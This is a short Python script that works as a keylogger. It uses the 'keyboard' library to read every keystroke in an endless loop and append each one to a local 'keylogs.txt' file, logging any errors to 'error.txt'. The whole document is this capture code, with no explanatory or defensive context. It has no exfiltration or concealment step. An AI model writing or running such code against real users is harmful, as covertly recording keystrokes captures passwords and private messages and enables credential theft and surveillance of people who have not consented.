import keyboard
import time
import os

try:
    with open("keylogs.txt", "a") as f:
        while True:
            key = keyboard.read_key()
            f.write(key + "\n")
except Exception as e:
    with open("error.txt", "a") as f:
        f.write(str(e) + "\n")